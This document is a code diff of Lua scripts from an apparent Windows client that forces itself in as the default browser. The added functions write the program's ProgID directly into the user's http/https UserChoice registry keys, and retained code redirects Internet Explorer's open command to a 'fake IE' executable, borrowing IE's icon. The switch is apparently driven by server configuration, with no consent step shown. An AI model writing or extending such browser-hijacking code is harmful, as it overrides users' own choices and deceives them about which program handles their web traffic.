@@ -281,7 +281,11 @@ function TrySetDefaultBrowser(tServerConfig, bIgnoreSpanTime)
 		return false
 	end
 	
-	DoSetDefaultBrowser()
+	local bSuccess = DoSetDefaultBrowser()
+	if not bSuccess then
+		FunctionObj.TipLog("[TrySetDefaultBrowser] DoSetDefaultBrowser failed")
+		return false
+	end	
 		
 	tUserConfig["nLastSetDefaultUTC"] = tipUtil:GetCurrentUTCTime()
 	FunctionObj.SaveConfigToFileByKey("tUserConfig")
@@ -353,32 +357,119 @@ function CheckBrowserList(strProcessList)
 end
 
 
-function DoSetDefaultBrowser()
+function RedirectSysIEPath()
 	local FunctionObj = XLGetGlobal("YBYL.FunctionHelper") 
+	
 	local strFakeIEPath = FunctionObj.GetExePath()
-	local strDefBrowRegPath = "HKEY_CLASSES_ROOT\\http\\shell\\open\\command\\"
-	local strOldDefBrowPath = FunctionObj.RegQueryValue(strDefBrowRegPath)
-	
-	if IsRealString(strOldDefBrowPath) and string.find(strOldDefBrowPath, strFakeIEPath) then
-		FunctionObj.TipLog("[DoSetDefaultBrowser] has set default browser -- http")
-		return
-	end
-
-	FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\HKCRHttp", strOldDefBrowPath)
-	
-	local strCommand = "\""..strFakeIEPath.."\" /openlink %1"
-	FunctionObj.RegSetValue(strDefBrowRegPath, strCommand)
-	
-	------
 	local strIERegPath = "HKEY_CLASSES_ROOT\\Applications\\iexplore.exe\\shell\\open\\command\\"
 	local strOldIEPath = FunctionObj.RegQueryValue(strIERegPath)
 	if IsRealString(strOldIEPath) and string.find(strOldIEPath, strFakeIEPath) then
-		FunctionObj.TipLog("[DoSetDefaultBrowser] has set default browser -- Applications")
+		FunctionObj.TipLog("[RedirectSysIEPath] has set default browser -- Applications")
 		return
 	end
 	
+	local strCommand = "\""..strFakeIEPath.."\" /openlink %1"
 	FunctionObj.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\HKCRAppIE", strOldIEPath)
-	FunctionObj.RegSetValue(strIERegPath, strCommand)
+	FunctionObj.RegSetValue(strIERegPath, strCommand, true)
+end
+
+
+-- 准备progid
+function PrepareProgID(strProgID)
+	local tFunHelper = XLGetGlobal("YBYL.FunctionHelper") 
+
+	local strBrowserPath = tFunHelper.GetExePath()
+	strBrowserPath = "\""..strBrowserPath.."\""
+	local strCommand = strBrowserPath.." /openlink %1"
+
+	local strRegValue = tFunHelper.RegQueryValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\shell\\open\\command\\")
+	if not IsRealString(strRegValue) then
+		tipUtil:CreateRegKey("HKEY_CLASSES_ROOT", strProgID.."\\shell\\open\\command")
+		tFunHelper.RegSetValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\shell\\open\\command\\", strCommand)
+	end
+	local strRegValue = tFunHelper.RegQueryValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\shell\\open\\command\\")
+	if not IsRealString(strRegValue) then
+		return false --写失败
+	end
+
+	local strRegValue = tFunHelper.RegQueryValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\Application\\ApplicationIcon")
+	if not IsRealString(strRegValue) then
+		tipUtil:CreateRegKey("HKEY_CLASSES_ROOT", strProgID.."\\Application")
+		tFunHelper.RegSetValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\Application\\ApplicationIcon", strBrowserPath)
+	end
+	local strRegValue = tFunHelper.RegQueryValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\Application\\ApplicationIcon")
+	if not IsRealString(strRegValue) then
+		return false
+	end
+	
+	-- 设置默认图标
+	local strRegValue = tFunHelper.RegQueryValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\DefaultIcon\\")
+	if not IsRealString(strRegValue) then
+		local strRegIconPath = "HKEY_CLASSES_ROOT\\IE.HTTP\\DefaultIcon\\"
+		local strIcoPath = tFunHelper.RegQueryValue(strRegIconPath)
+
+		if IsRealString(strIcoPath) then
+			tipUtil:CreateRegKey("HKEY_CLASSES_ROOT", strProgID.."\\DefaultIcon")
+			tFunHelper.RegSetValue("HKEY_CLASSES_ROOT\\"..strProgID.."\\DefaultIcon\\", strIcoPath) 
+		end
+	end
+	
+	return true
+end
+
+
+function SetFakeIERegInUAC(strCommand)
+	local tFunHelper = XLGetGlobal("YBYL.FunctionHelper") 
+	local strProgID = "IEHTML"
+	
+	local bSuccess = PrepareProgID(strProgID)
+	if not bSuccess then
+		tFunHelper.TipLog("[SetFakeIERegInUAC] PrepareProgID failed ")
+		return false
+	end
+	
+	local bIs64 = tFunHelper.CheckIs64OS()
+	local bRefresh = false
+	--设置默认浏览器
+	local strRegPath = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice\\Progid"
+	local strRegValue = tFunHelper.RegQueryValue(strRegPath)
+	if strRegValue ~= strProgID then
+		tFunHelper.RegSetValue(strRegPath, strProgID)
+		tFunHelper.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\HTTPProgid", strRegValue, bIs64)
+		bRefresh = true
+	end
+	
+	local strRegPath = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\https\\UserChoice\\Progid"
+	local strRegValue = tFunHelper.RegQueryValue(strRegPath)
+	if strRegValue ~= strProgID then
+		tFunHelper.RegSetValue(strRegPath, strProgID)
+		tFunHelper.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\HTTPSProgid", strRegValue, bIs64)
+		bRefresh = true
+	end
+	
+	if bRefresh then
+		tipUtil:RefleshIcon(nil)
+	end
+	
+	return true
+end
+
+
+function DoSetDefaultBrowser()
+	local tFunHelper = XLGetGlobal("YBYL.FunctionHelper") 
+	local strBrowserPath = tFunHelper.GetExePath()
+	if not IsRealString(strBrowserPath) or not tipUtil:QueryFileExists(strBrowserPath) then
+		return false
+	end
+	
+	-- RedirectSysIEPath()
+	
+	local bSuccess = SetFakeIERegInUAC()
+	if not bSuccess then
+		return false
+	end
+
+	return true
 end
 
 
